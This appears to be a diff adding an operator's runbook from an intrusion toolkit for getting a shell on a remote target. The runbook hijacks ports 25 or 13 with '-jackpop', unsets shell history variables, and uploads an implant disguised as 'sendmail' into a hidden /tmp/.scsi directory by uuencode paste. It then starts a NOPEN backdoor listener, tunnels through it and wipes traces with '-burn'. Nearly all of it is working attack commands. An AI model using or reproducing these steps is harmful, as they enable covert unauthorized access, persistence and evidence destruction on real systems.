@@ -1,0 +1,189 @@
+################
+#### Jackpop to get a shell on target (Hey,
+#### why didn't we try this before?)
+################
+
+# Don't forget: -jackpop does not like its old windows
+# existing still on later tries.
+
+# port-to-jack: 25 works. 13 works. Maybe others?
+
+-jackpop REMOTEIP port-to-jack PITCH_IP random11111-44444-3
+
+# Option 3 run command on target.
+# Choose offset if needed, and IN bless or not.
+3
+
+
+# Command to run:
+cd /tmp ; ls -arlt ; mkdir .scsi ; cd .scsi ; ls -alrt ; pwd ; exec sh
+
+
+# That popped up window is sort-of a shell,make sure you're in /tmp/.scsi
+# and it's empty.
+
+################
+#### WARNING:
+#### This popped up shell window must be exited with "exit" and NOT ^D.
+#### If you exit with ^D the sh and maybe other processes will be
+#### stranded and not die cleanly.
+################
+# This is important: without it the uudecode fails, but
+# otherwise it doesn't do much visibly.
+stty -echo
+
+# We use this shell to upload poptop and noserver.
+# But first...(paste the whole bunch)
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+type perl uudecode uncompress tar
+
+
+# if the type command fails try:
+which perl uudecode uncompress tar
+
+######
+## LOCAL PREP (can do from any local dir--paste complete blocks)
+## Some of these you willl not use, FYI.
+######
+
+
+## Make sure this is right noserver
+cp /current/up/noserver /current/up/sendmail
+## pick right poptop
+cp /current/up/poptop.sparc /current/up/pt
+sum -s /current/up/pt /current/up/sendmail
+chown 0:0 /current/up/pt* /current/up/sendmail*
+tar -C /current/up -cvf /current/up/u.tar sendmail pt
+compress -c /current/up/u.tar > /current/up/u.tar.Z
+uuencode /current/up/u.tar.Z u.tar.Z > /current/up/u.tar.Z.uu
+gedit /current/up/u.tar.Z.uu&
+ls -arlt /current/up | egrep "uu$|u.tar|sendmail| pt|poptop|noserver"
+
+
+## Probably don't need the rest unless target has no tar or uncompress:
+uuencode /current/up/pt pt > /current/up/pt.uu
+uuencode /current/up/sendmail sendmail > /current/up/sendmail.uu
+uuencode /current/up/u.tar u.tar > /current/up/u.tar.uu
+gedit /current/up/*.uu&
+ls -arlt /current/up | egrep "uu$|u.tar|sendmail| pt|poptop|noserver"
+
+
+#################################### EITHER THIS (if uudecode on target)
+######
+## REMOTE
+######
+uudecode
+
+######
+## LOCALLY select the gedit tab for what you want to 
+## paste up there (based on whether uncompress is there).
+## The top one, u.tar.Z, is likely what you want.
+## Then middle-click paste it into target window.
+######
+
+#################################### OR THIS (if perl is there)
+
+######
+## no uudecode but we do have perl on target?
+######
+## LOCALLY run one of these (brings up new tab in gedit--use it)
+## if uncompress on target
+uudecode.pastable /current/up/u.tar.Z u.tar.Z
+## if not
+uudecode.pastable /current/up/u.tar u.tar
+
+######
+## LOCALLY select the gedit tab for what you want to 
+## paste up there (based on whether uncompress is there)
+## Then middle-click paste it into target window.
+######
+
+#################################### THEN FOLLOW WITH THIS
+
+######
+## REMOTE--choose whatever makes sense--all should be safe
+######
+ls -arlt
+
+uncompress *Z
+for i in *tar ; do tar xvf $i ; done
+ls -arlt
+
+
+## If it unpacked OK.
+rm u.tar*
+
+
+#################################### ARE WE THERE YET?
+
+######
+## LOCALLY Start this in a scripted window
+## local poptop always connects to 8080
+######
+noclient -l 8080
+
+
+######
+## REMOTE -- Time to run NOPEN (and it inherits this session via pt)
+######
+
+# Start server listening
+PATH=. D=-lrandom22222-55555-1 sendmail
+
+# Use this session to connect to it via pt
+# (you should see "tty should be setup...")
+PATH=. pt random22222-55555-1
+
+
+# Typing this next "---\n" string activates poptop here and
+# there to connect a local noclient to the remote noserver
+# via this already established TCP session.
+---
+
+
+######
+## FINI - clean up a bit
+######
+## Once NOPEN is up and running, both the previous hop's
+## noclient window where -jackpop was run and the 
+## shell window it popped up will be tied up.
+## Post -burnBURN on the new nopen, the popped up
+## window should exit on its own. DONE in the -jackpop
+## window.
+######
+-cd /tmp
+rm -rf /tmp/.scsi
+
+# Op away....
+
+######
+## Need multiple windows?
+######
+-tunnel
+l random22222-55555-1 127.0.0.1 random22222-55555-1
+
+######
+## LOCALLY then
+######
+noclient -c "-cd /tmp" 127.0.0.1:random22222-55555-1
+
+
+
+## Bailing
+-burn
+BURN
+
+
+DONE
+
+
+
+PATH=. D=-l18787 sendmail
+cd /tmp
+PATH=/tmp/.scsi pt 18787
+
+
+
+
